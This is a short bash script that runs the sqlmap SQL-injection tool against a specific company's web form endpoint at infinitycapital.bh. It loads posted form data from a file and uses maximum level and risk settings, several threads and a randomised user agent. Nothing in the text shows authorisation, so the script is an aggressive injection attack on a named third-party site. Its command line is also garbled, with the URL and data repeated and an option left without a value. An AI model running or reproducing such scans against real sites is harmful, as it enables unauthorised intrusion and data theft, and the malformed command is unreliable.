#!/bin/bash
cd "$WORK_PATH"
DATA=$(cat tool_outputs/send_data.txt)
sqlmap -u "https://www.infinitycapital.bh/api/send" --data "$DATA" https://www.infinitycapital.bh/api/send --data fname=a&lname=b&areacode=%2B973&tel=12345678&cname=a&subject=s&msg=hello&check=1&targets=%5B%22probe%40infinitycapital.bh%22%5D --method --batch --level=5 --risk=3 --threads=4 --random-agent --timeout=15 --retries=1 --output-dir=tool_outputs/sqlmap --flush-session
